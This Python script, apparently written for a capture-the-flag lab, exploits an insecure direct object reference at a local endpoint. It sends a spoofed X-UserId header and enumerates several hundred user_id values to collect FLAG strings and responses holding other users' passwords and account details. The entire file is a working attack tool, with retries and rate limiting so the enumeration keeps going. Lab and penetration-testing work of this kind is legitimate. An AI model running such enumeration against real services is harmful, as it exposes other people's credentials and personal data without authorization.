import requests
import re
import sys
import time
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry

# Configuration
target_url = "http://127.0.0.1:33200/password/test"
headers = {
    "X-UserId": "10032",
    "User-Agent": "Security-Testing-Agent"
}

# Setup session with retry strategy
session = requests.Session()
retry_strategy = Retry(
    total=3,
    backoff_factor=0.5,
    status_forcelist=[429, 500, 502, 503, 504],
)
adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=10, pool_maxsize=10)
session.mount("http://", adapter)
session.mount("https://", adapter)

# Regex for FLAG pattern
flag_pattern = re.compile(r'FLAG\{[^}]+\}')

# Track results
found_flags = []
successful_ids = []
error_ids = []
no_data_ids = []
total_requests = 0
stop_early = False

print("="*80)
print("IDOR FUZZING CAMPAIGN - /password/test (RESILIENCE ENHANCED)")
print("="*80)
print(f"Target URL: {target_url}")
print(f"Auth Header: X-UserId: 10032")
print(f"Total requests to make: 427 (with rate limiting)")
print("="*80)

# Range 1: user_id=1 to user_id=300
range1_start, range1_end = 1, 300
print(f"\n[+] Range 1: user_id={range1_start} to user_id={range1_end}")
print("-"*80)

for user_id in range(range1_start, range1_end + 1):
    if stop_early:
        break
        
    total_requests += 1
    try:
        params = {"user_id": user_id}
        response = session.get(
            target_url,
            headers=headers,
            params=params,
            timeout=15
        )
        
        # Extract flag if present
        flags_found = flag_pattern.findall(response.text)
        if flags_found:
            for flag in flags_found:
                found_flags.append((user_id, flag))
                print(f"[!] FLAG FOUND at user_id={user_id}: {flag}")
            stop_early = True
            break
        
        # Check for sensitive data patterns
        has_password = "password" in response.text.lower()
        has_user_info = any(keyword in response.text.lower() 
                           for keyword in ["username", "email", "user_id", "account"])
        
        if response.status_code == 200:
            if response.text.strip() and (has_password or has_user_info):
                successful_ids.append(user_id)
                print(f"[+] user_id={user_id:4d} | Status: {response.status_code} | Length: {len(response.text)}B")
                if has_password:
                    print(f"    [!] Contains password data")
                if has_user_info:
                    print(f"    [!] Contains user information")
                # Show first 150 chars
                snippet = response.text[:150].replace('\n', ' ')
                print(f"    Snippet: {snippet}")
            else:
                no_data_ids.append(user_id)
                if user_id % 10 == 0:  # Show progress every 10 requests
                    print(f"[-] Progress: user_id={user_id:4d} | No relevant data")
        else:
            error_ids.append((user_id, response.status_code))
            print(f"[-] user_id={user_id:4d} | Status: {response.status_code} | Error")
            
    except Exception as e:
        print(f"[ERROR] user_id={user_id:4d} | Exception: {str(e)[:80]}")
        error_ids.append((user_id, f"EXCEPTION: {str(e)[:30]}"))
    
    # Rate limiting - small delay between requests
    time.sleep(0.1)

# Range 2: user_id=10025 to user_id=10150
if not stop_early:
    range2_start, range2_end = 10025, 10150
    print(f"\n[+] Range 2: user_id={range2_start} to user_id={range2_end}")
    print("-"*80)
    
    for user_id in range(range2_start, range2_end + 1):
        if stop_early:
            break
            
        total_requests += 1
        try:
            params = {"user_id": user_id}
            response = session.get(
                target_url,
                headers=headers,
                params=params,
                timeout=15
            )
            
            # Extract flag if present
            flags_found = flag_pattern.findall(response.text)
            if flags_found:
                for flag in flags_found:
                    found_flags.append((user_id, flag))
                    print(f"[!] FLAG FOUND at user_id={user_id}: {flag}")
                stop_early = True
                break
            
            # Check for sensitive data patterns
            has_password = "password" in response.text.lower()
            has_user_info = any(keyword in response.text.lower() 
                               for keyword in ["username", "email", "user_id", "account"])
            
            if response.status_code == 200:
                if response.text.strip() and (has_password or has_user_info):
                    successful_ids.append(user_id)
                    print(f"[+] user_id={user_id:5d} | Status: {response.status_code} | Length: {len(response.text)}B")
                    if has_password:
                        print(f"    [!] Contains password data")
                    if has_user_info:
                        print(f"    [!] Contains user information")
                    # Show first 150 chars
                    snippet = response.text[:150].replace('\n', ' ')
                    print(f"    Snippet: {snippet}")
                else:
                    no_data_ids.append(user_id)
                    if (user_id - range2_start) % 10 == 0:  # Show progress every 10
                        print(f"[-] Progress: user_id={user_id:5d} | No relevant data")
            else:
                error_ids.append((user_id, response.status_code))
                print(f"[-] user_id={user_id:5d} | Status: {response.status_code} | Error")
                
        except Exception as e:
            print(f"[ERROR] user_id={user_id:5d} | Exception: {str(e)[:80]}")
            error_ids.append((user_id, f"EXCEPTION: {str(e)[:30]}"))
        
        # Rate limiting
        time.sleep(0.1)

# Final Summary
print("\n" + "="*80)
print("FUZZING CAMPAIGN COMPLETE")
print("="*80)
print(f"Total requests made: {total_requests}")
print(f"Successful IDs with data: {len(successful_ids)}")
print(f"IDs with no relevant data: {len(no_data_ids)}")
print(f"Error responses: {len(error_ids)}")

if found_flags:
    print("\n" + "="*80)
    print("[!] FLAGS DISCOVERED:")
    print("="*80)
    for user_id, flag in found_flags:
        print(f"  user_id={user_id}: {flag}")
        
if successful_ids:
    print(f"\n[+] ACCESSIBLE IDs (returned sensitive data):")
    for uid in successful_ids:
        print(f"  user_id={uid}")
    
if error_ids:
    print(f"\n[-] ERROR IDs (first 10):")
    for uid, status in error_ids[:10]:
        print(f"  user_id={uid}: {status}")

print("\n" + "="*80)

# Close session
session.close()

# Exit with appropriate status
if found_flags:
    sys.exit(0)  # Success
else:
    print("[i] No flags found in accessible IDs")
    sys.exit(1)  # No flag found
